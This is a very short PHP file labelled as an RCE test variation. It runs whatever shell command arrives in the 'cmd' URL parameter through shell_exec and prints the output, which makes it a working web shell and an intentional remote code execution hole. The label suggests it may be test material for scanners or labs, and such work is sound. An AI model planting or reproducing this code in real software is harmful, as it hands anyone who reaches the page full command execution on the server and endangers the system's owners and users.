<?php
// RCE test variation #172
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>